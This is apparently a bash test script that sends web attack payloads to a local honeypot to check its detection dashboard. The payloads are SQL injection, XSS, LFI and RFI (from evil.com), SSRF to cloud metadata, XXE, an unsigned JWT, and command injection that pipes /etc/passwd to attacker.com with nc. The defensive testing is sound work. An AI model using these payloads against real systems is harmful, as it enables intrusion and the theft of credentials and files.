#!/bin/bash

# test_attacks.sh - Simulate web attacks against the honeypot
# Run this script while the honeypot is running on localhost:5000

URL="http://localhost:5000"

echo "========================================="
echo "💥 Starting Automated Attack Simulation 💥"
echo "========================================="
echo ""

# 1. SQL Injection
echo "[*] Testing SQL Injection..."
curl -s "$URL/login?username=admin' OR 1=1 --" > /dev/null
curl -s "$URL/login?username=admin' UNION SELECT * FROM users --" > /dev/null
echo "✓ SQLi payloads sent."

# 2. XSS (Cross-Site Scripting)
echo "[*] Testing XSS..."
curl -s "$URL/search?q=<script>alert(1)</script>" > /dev/null
curl -s "$URL/search?q=<img src=x onerror=alert(document.cookie)>" > /dev/null
echo "✓ XSS payloads sent."

# 3. LFI (Local File Inclusion)
echo "[*] Testing LFI..."
curl -s "$URL/page?id=../../etc/passwd" > /dev/null
curl -s "$URL/page?id=php://filter/resource=config.php" > /dev/null
echo "✓ LFI payloads sent."

# 4. RFI (Remote File Inclusion)
echo "[*] Testing RFI..."
curl -s "$URL/page?id=http://evil.com/shell.txt" > /dev/null
echo "✓ RFI payloads sent."

# 5. Directory Traversal
echo "[*] Testing Directory Traversal..."
curl -s "$URL/download?file=../../../etc/shadow" > /dev/null
echo "✓ Directory Traversal payloads sent."

# 6. Command Injection
echo "[*] Testing Command Injection..."
curl -s "$URL/execute?cmd=; ls -la" > /dev/null
curl -s "$URL/execute?cmd=cat /etc/passwd | nc attacker.com 4444" > /dev/null
echo "✓ Command Injection payloads sent."

# 7. Bot Scanning
echo "[*] Testing Bot Scan..."
curl -s "$URL/phpmyadmin" > /dev/null
curl -s "$URL/.env" > /dev/null
curl -s "$URL/wp-login.php" > /dev/null
echo "✓ Bot scan paths requested."

# 8. File Upload Attack
echo "[*] Testing File Upload Attack..."
curl -s -X POST -F "file=@/etc/passwd;filename=shell.php" "$URL/upload" > /dev/null
echo "✓ File upload payload sent."

# 9. JSON SQLi Payload (Dataset specific test)
echo "[*] Testing JSON-based SQLi (CRS specific)..."
curl -s -X POST -H "Content-Type: application/json" -d '{"user": "\"'{\"a\":1}\"'", "pass": "test"}' "$URL/login" > /dev/null
echo "✓ JSON SQLi payload sent."

# 10. SSRF
echo "[*] Testing SSRF..."
curl -s "$URL/proxy?url=http://169.254.169.254/latest/meta-data/" > /dev/null
echo "✓ SSRF payload sent."

# 11. SSTI
echo "[*] Testing SSTI..."
curl -s "$URL/template?name={{7*7}}" > /dev/null
echo "✓ SSTI payload sent."

# 12. Open Redirect
echo "[*] Testing Open Redirect..."
curl -s "$URL/login?next=http://evil.com" > /dev/null
echo "✓ Open Redirect payload sent."

# 13. JWT Attack
echo "[*] Testing JWT Attack..."
curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." "$URL/" > /dev/null
echo "✓ JWT Attack payload sent."

# 14. XXE
echo "[*] Testing XXE..."
curl -s -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>' "$URL/upload" > /dev/null
echo "✓ XXE payload sent."

# 15. Admin Access
echo "[*] Testing Admin Access..."
curl -s "$URL/admin/dashboard" > /dev/null
curl -s "$URL/administrator/" > /dev/null
echo "✓ Admin Access paths requested."

# 16. Sensitive File Access
echo "[*] Testing Sensitive File Access..."
curl -s "$URL/.git/config" > /dev/null
echo "✓ Sensitive File path requested."

# 17. API Enumeration
echo "[*] Testing API Enumeration..."
curl -s "$URL/api/v1/users" > /dev/null
echo "✓ API Enumeration paths requested."

# 18. Unknown Payload (Should map to 'Unknown')
echo "[*] Testing Unknown Payload Generation..."
curl -s "$URL/search?q=SUPER_WEIRD_UNEXPECTED_STRING_1234567890_WITH_BRACKETS_[AND]_SOME_{BRACES}" > /dev/null
echo "✓ Unknown payload sent."

echo ""
echo "========================================="
echo "✅ Attack Simulation Complete"
echo "Check the Honeypot Dashboard (http://localhost:5000/dashboard) to view logs."
echo "========================================="
